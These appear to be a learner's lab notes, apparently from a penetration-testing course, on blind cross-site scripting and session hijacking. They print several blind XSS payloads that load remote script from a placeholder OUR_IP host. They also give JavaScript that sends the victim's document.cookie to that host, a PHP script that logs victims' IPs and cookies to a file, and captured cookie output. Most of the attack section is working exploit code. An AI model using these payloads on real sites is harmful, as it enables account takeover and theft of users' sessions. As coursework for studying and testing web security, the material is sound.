
***
###### `Title :- Session Hijacking`
###### `Created on :- 2023-06-13 - 06:19`
###### `Created by:- Prem J`
***

- Modern web applications utilize cookies to maintain a user's session throughout different browsing sessions. This enables the user to only log in once and keep their logged-in session alive even if they visit the same website at another time or date
- attacker with the ability to execute JavaScript on victim's browser can leverage this and attain target cookies to hijack their logged-in session performing a ***Session Hijacking*** or ***Cookie Stealing***

#### `Blind XSS Detection -->`

- A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to, it is similar to stored XSS, but we can't really see the payload working or be able to test against yourself first.
- Blind XSS vulnerabilites usually occur with forms only accessible by certain users.

#### `Example Scenario -->`

- let us take a forum which will be filled by us and reviewed by someone else.

![[Pasted image 20230613065141.png]]

- once we submit it will be showing, Indicating that we will not see how out input will be handled or how it will look in the browser since it will be appearing only for the admin

![[Pasted image 20230613065210.png]]

- If we could be able to see the process of input handling we add alert box in each field verify for XSS vulnerability.
- We will use a JavaScript payload that sends an HTTP request back to our server. If the JavaScript code gets executed, we will get a response on our machine, and we will know that the page is indeed vulnerable.
- However, this introduces ***two issues***:

1. `How can we know which specific field is vulnerable?` Since any of the fields may execute our code, we can't know which of them did.
2. `How can we know what XSS payload to use?` Since the page may be vulnerable, but the payload may not work?

#### `Loading Remote Script -->`

- In HTML, we can write JavaScript code within the `<script>` tags, but we can also include a remote script by providing its URL, as follows:

```html
<script src="http://OUR_IP/script.js"></script>
```

- So, we can use this to execute a remote JavaScript file that is served on our VM. We can change the requested script name from `script.js` to the ***name of the field*** we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script, as follows:

```html
<script src="http://OUR_IP/username"></script>
```

- If we get a request for `/username`, then we know that the `username` field is vulnerable to XSS, and so on. With that, we can start testing various XSS payloads that load a remote script and see which of them sends us a request. The following are a few examples we can use from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

- before we start sending payloads we need to start a listener using `netcat` or `php` same as in [[Phishing#`Credential Stealing -->`]], after which we can start testing the payloads

```html
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
...SNIP...
```

>[!tip]
>We will notice that the email must match an email format, even if we try manipulating the HTTP request parameters, as it seems to be validated on both the front-end and the back-end. Hence, the email field is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext. This helps us in reducing the number of potentially vulnerable input fields we need to test.

- Once we submit the form, we wait a few seconds and check our terminal to see if anything called our server. If nothing calls our server, then we can proceed to the next payload, and so on. Once we receive a call to our server, we should note the last XSS payload we used as a working payload and note the input field name that called our server as the vulnerable input field.

![[Screenshot from 2023-06-13 07-49-15.png]]

#### `Session Hijacking -->`

- Upon finding a working payload and the vulnerable input field, we can proceed to XSS exploitation to perform a session hijacking attack.
- There are multiple JavaScript payloads we can use to grab the session cookie and send it to us, as shown by [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc):

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

- above two perform the session hijack, we can write any of the two to `script.js`. Now, we can change the URL in the XSS payload we found earlier to use `script.js`

```html
<script src=http://OUR_IP/script.js></script>
```

- With our PHP server running, we can now use the code as part of our XSS payload, send it in the vulnerable input field, and we should get a call to our server with the cookie value. 
- However, if there were many cookies, we may not know which cookie value belongs to which cookie header. So, we can write a PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.
- We can save the following PHP script as `index.php`, and re-run the PHP server again:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

- Above script is different from one in [[Phishing]]
- Now, we wait for the victim to visit the vulnerable page and view our XSS payload. Once they do, we will get two requests on our server, one for `script.js`, which in turn will make another request with the cookie value:

```shell-session
premjampuram@htb[/htb]$ cat cookies.txt 
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

- We can use the cookies in login page as a key-value pair in storage to gain the target session.